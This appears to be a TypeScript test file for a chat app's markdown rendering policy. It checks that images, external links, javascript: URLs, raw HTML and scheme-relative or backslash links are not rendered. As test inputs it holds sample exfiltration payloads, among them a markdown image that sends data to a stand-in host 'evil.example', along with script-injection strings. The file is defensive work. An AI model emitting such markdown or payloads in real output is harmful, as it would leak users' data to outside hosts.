import { test } from "node:test";
import assert from "node:assert/strict";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { internalHref, policyComponents } from "./markdown-policy.ts";

// Renders exactly as the chat does (remark-gfm, skipHtml, policy components).
const render = (md: string) =>
  renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], skipHtml: true, components: policyComponents }, md));

test("images never render, so nothing is fetched", () => {
  const html = render("Here: ![leak](https://evil.example/c?d=PRIYA_75000) and ![](data:image/png;base64,AAAA)");
  assert.ok(!/<img/i.test(html), html);
  assert.ok(!html.includes("evil.example"), "the URL isn't emitted at all");
  assert.match(html, /\[leak\]/);
});

test("reference-style and autolinked images don't render either", () => {
  const html = render("![x][ref]\n\n[ref]: https://evil.example/p.png");
  assert.ok(!/<img/i.test(html), html);
});

test("external links render as plain text", () => {
  for (const md of ["[click](https://evil.example/?d=secret)", "<https://evil.example/x>", "https://evil.example/auto", "[m](mailto:x@evil.example)", "[j](javascript:alert(1))"]) {
    const html = render(md);
    assert.ok(!/<a /i.test(html), `${md} -> ${html}`);
  }
});

test("links inside the app stay clickable", () => {
  const html = render("See [Priya](/leads/123) and [billing](/settings/billing?x=1)");
  assert.match(html, /<a href="\/leads\/123"/);
  assert.match(html, /<a href="\/settings\/billing\?x=1"/);
});

test("scheme-relative and backslash links are not treated as internal", () => {
  for (const href of ["//evil.example", "/\\evil.example", "/%5Cevil.example"]) assert.equal(internalHref(href), null, href);
});

test("raw HTML is not rendered", () => {
  const html = render('<img src="https://evil.example/x.png"><script>alert(1)</script><a href="https://evil.example">x</a>');
  assert.ok(!/<img|<script|<a /i.test(html), html);
});
